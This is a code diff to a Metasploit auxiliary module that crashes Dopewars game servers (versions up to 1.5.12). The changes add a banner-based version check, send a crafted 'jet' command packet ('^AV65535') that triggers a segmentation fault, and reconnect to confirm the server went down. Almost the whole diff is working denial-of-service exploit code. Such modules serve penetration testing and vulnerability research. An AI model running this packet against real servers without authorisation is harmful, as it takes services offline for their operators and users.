@@ -12,8 +12,8 @@ class Metasploit3 < Msf::Auxiliary
 		super(update_info(info,	
 			'Name'           => 'Dopewars Denial of Service',
 			'Description'    => %q{
-				This module sends a specially-crafted packet to a Dopewars 
-				server, causing a SEGFAULT.
+				This module sends a specially-crafted jet command to a Dopewars 
+				server, causing a SEGFAULT. Affects versions <= 1.5.12.
 			},
 			'Author'         => [ 'dougsko' ],
 			'License'        => GPL_LICENSE,
@@ -31,24 +31,30 @@ class Metasploit3 < Msf::Auxiliary
 	def run
 		connect
 
-        # jet command
-        # Program received signal SIGSEGV, Segmentation fault.
-        # [Switching to Thread 0xb74916c0 (LWP 30638)]
-        # 0x08062f6e in HandleServerMessage (buf=0x8098828 "", Play=0x809a000) at
-        # serverside.c:525
-        # 525           dopelog(4, LF_SERVER, "%s jets to %s",
+        # Check if vulnerable
+        print_status("Checking version...")
+        hello_pkt = "foo^^Ar1111111\n^^Acfoo\n"
+        sock.put(hello_pkt)
+        sock.get.match(/\^Ak(\d+\.\d+\.\d+)/)
+        version = $1.gsub(/\./,'').to_i
+        if version > 1512
+            print_status("This system appears to be patched")
+            return Exploit::CheckCode::Safe
+        end
 
-		pkt =  "foo^^Ar1111111\n^^Acfoo\n^AV65536\n"
+        # Send evil jet command
+		dos_pkt =  "^AV65535\n"
 	
 		print_status("Sending dos packet...")
 		
-		sock.put(pkt)
+		sock.put(dos_pkt)
 		
 		disconnect
 
+        # Make sure it worked
         print_status("Checking for success...")
-        sleep 2
         begin
+            print_status("Trying to reconnect to server")
             connect
         rescue ::Interrupt
             raise $!
